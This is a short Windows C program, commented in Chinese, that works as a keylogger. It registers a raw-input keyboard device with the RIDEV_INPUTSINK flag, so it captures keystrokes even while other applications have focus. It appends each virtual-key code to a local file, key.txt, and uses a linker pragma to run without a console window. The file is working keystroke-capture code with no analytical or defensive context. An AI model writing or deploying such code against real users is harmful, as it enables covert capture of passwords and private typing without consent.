#include <stdio.h>
#include <windows.h>
#include "resource.h"
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

BOOL GetData(LPARAM lParam)
{
	RAWINPUT rawInput = { 0 };
	UINT dwSize = sizeof(rawInput);
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawInput, &dwSize, sizeof(RAWINPUTHEADER)); // 获取原始输入数据
	if (rawInput.header.dwType == RIM_TYPEKEYBOARD)
	{
		if ((rawInput.data.keyboard.Message == WM_KEYDOWN) || (rawInput.data.keyboard.Message == WM_SYSKEYDOWN))
		{
			char wcKey[256];
			sprintf(wcKey, "%d", rawInput.data.keyboard.VKey);
			FILE* fp = NULL;
			fopen_s(&fp, "key.txt", "a+");
			if (fp == NULL)
			{
				MessageBox(NULL, "文件保存失败", "警告", MB_OK);
				return FALSE;
			}
			fwrite(wcKey, strlen(wcKey) + 1, 1, fp);
			fclose(fp);
		}
	}
	return TRUE;
}

BOOL CALLBACK DlgMsgCallback(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	if (uiMsg == WM_INITDIALOG)
	{
		// 注册原始输入设备
		RAWINPUTDEVICE rawInputDevice = { 0 };
		rawInputDevice.usUsagePage = 0x1; // 原始输入设备的顶级集合使用情况页
		rawInputDevice.usUsage = 0x6; // 原始输入设备的顶级集合使用情况 ID 0x0006-0x0007 键盘/键盘类驱动程序和映射器驱动程序
		rawInputDevice.hwndTarget = hWnd;
		rawInputDevice.dwFlags = RIDEV_INPUTSINK; // 指定如何解释 usUsagePage 和 usUsage 提供的信息的模式标志 RIDEV_INPUTSINK 0x00000100 如果已设置，则即使调用方不在前台，调用方也能够接收输入。 请注意，必须指定 hwndTarget 。
		::RegisterRawInputDevices(&rawInputDevice, 1, sizeof(rawInputDevice)); // 注册原始输入设备
		return TRUE;
	}
	else if (uiMsg == WM_CLOSE)
	{
		// 关闭窗口
		EndDialog(hWnd, NULL);
	}
	else if (uiMsg == WM_INPUT)
	{
		// 保存按键
		GetData(lParam);
	}
	return TRUE;
}

int main()
{
	HINSTANCE hInstance = GetModuleHandle(NULL);
	DialogBoxParam(hInstance, (LPCSTR)IDD_DIALOG1, NULL, (DLGPROC)DlgMsgCallback, NULL);
	ExitProcess(0);
	return 0;
}